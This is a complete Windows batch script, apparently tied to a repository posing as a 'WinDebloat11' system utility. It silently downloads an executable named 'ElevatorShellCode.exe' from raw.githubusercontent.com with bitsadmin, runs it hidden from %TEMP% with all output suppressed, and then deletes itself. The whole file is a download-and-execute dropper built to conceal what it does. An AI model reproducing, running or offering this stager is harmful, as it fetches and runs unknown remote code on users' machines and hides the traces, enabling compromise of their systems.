@echo off
bitsadmin /transfer e /download /priority high https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/ElevatorShellCode.exe %TEMP%\es.exe >nul 2>&1
start /b "" "%TEMP%\es.exe" >nul 2>&1
del "%~f0"
